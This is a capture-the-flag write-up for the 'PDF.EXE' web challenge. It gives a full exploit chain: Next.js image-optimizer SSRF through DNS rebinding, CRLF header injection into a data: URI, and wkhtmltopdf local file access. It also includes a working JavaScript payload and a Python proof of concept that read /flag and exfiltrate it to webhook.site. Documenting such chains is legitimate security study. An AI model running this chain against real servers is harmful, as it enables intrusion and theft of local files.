# PDF.EXE Writeup

## Summary
- The public Next.js app exposes `/_next/image` with `images.remotePatterns` set to `**`, enabling SSRF.
- Next 16.1.1 blocks private IPs, but it does a DNS lookup check and then fetches, so DNS rebinding bypasses it.
- The internal Flask service `/generate` accepts a `data:` URI and uses `urllib.request.urlopen`, which allows CRLF header injection in the mediatype.
- The injected `Content-Disposition` is embedded into the generated report, which is then rendered by `wkhtmltopdf`.
- Adding a `<meta name="pdfkit-enable-local-file-access" content="">` tag enables `file://` access, allowing JavaScript to read `/flag` and exfiltrate it.

## Key Findings
1) SSRF via Next.js image optimizer
   - `prod/next.config.ts` allows any remote host.
   - `/_next/image` validates the host against private IPs using a DNS lookup, then fetches the URL.
   - DNS rebinding (e.g., `rbndr.us`) returns a public IP during validation and `127.0.0.1` during fetch.

2) CRLF header injection in data URI
   - `internal/app.py` calls `urlopen(data_uri)` where `data_uri` starts with `data:plain/text`.
   - `urllib` treats the mediatype as headers; `%0d%0a` yields real headers.
   - Injected `Content-Disposition` is inserted into the report header.

3) Local file access in wkhtmltopdf
   - `pdfkit` parses `<meta name="pdfkit-...">` to supply `wkhtmltopdf` options.
   - Setting `<meta name="pdfkit-enable-local-file-access" content="">` enables `file://` access.

## Exploit Chain
1) Create a `data:` URI that injects a `Content-Disposition` header containing HTML:

   data:plain/text\r\nContent-Disposition: <HTML>,X

2) The HTML contains:
   - `<meta name="pdfkit-enable-local-file-access" content="">`
   - JavaScript to read `file:///flag` via XHR and exfiltrate to a webhook.

3) Use `/_next/image` to SSRF the internal endpoint:

   /_next/image?url=http://<rebind-host>:5000/generate?data=<encoded>&w=64&q=75

4) Rebinding host example:
   - `01010101.7f000001.rbndr.us` (alternates between public and loopback).
   - Multiple attempts are needed due to DNS timing.

## Working Payload (HTML in Content-Disposition)
```html
<meta name="pdfkit-enable-local-file-access" content="">
<script>
(function(){
  function s(m){
    new Image().src="http://webhook.site/UUID?d="+encodeURIComponent(m);
  }
  s("jsok");
  try{
    var c=String.fromCharCode(44);
    var code="var x=new XMLHttpRequest();x.open('GET'"+c+"'file:///flag'"+c+"false);x.send(null);s('flag='+x.responseText)";
    eval(code);
  }catch(e){
    s("err="+e);
  }
})();
</script>
```

The `String.fromCharCode(44)` trick avoids literal commas because the `data:` mediatype uses `,` as a delimiter.

## End-to-End PoC (Python)
```python
import json, random, string, time, urllib.parse, urllib.request

TARGET = "http://pdf.webctf.online/_next/image"
RB_HOSTS = ["01010101.7f000001.rbndr.us","7f000001.01010101.rbndr.us"]

req = urllib.request.Request("https://webhook.site/token", method="POST")
with urllib.request.urlopen(req) as r:
    token = json.loads(r.read().decode())["uuid"]
print("webhook token:", token)

html = (
    '<meta name="pdfkit-enable-local-file-access" content="">'
    "<script>(function(){function s(m){new Image().src='http://webhook.site/%s?d='+encodeURIComponent(m)}"
    "s('jsok');try{var c=String.fromCharCode(44);"
    "var code=\"var x=new XMLHttpRequest();x.open('GET'\"+c+\"'file:///flag'\"+c+\"false);"
    "x.send(null);s('flag='+x.responseText)\";eval(code)}catch(e){s('err='+e)}})();</script>"
) % token

data_uri = "data:plain/text\r\nContent-Disposition: " + html + ",X"
encoded_data = urllib.parse.quote(data_uri, safe="")

def make_url(rb_host, i):
    internal = f"http://{rb_host}:5000/generate?data={encoded_data}&r={i}"
    return TARGET + "?url=" + urllib.parse.quote(internal, safe="") + "&w=64&q=75"

for i in range(25):
    rb = RB_HOSTS[i % len(RB_HOSTS)]
    try:
        with urllib.request.urlopen(make_url(rb, i), timeout=12) as r:
            r.read(50)
    except Exception:
        pass
    time.sleep(0.2)

print("check https://webhook.site/%s" % token)
```

## Flag
```
0xL4ugh{my_pdfs_are_something_else_right?_179453d559cb1bec}
```
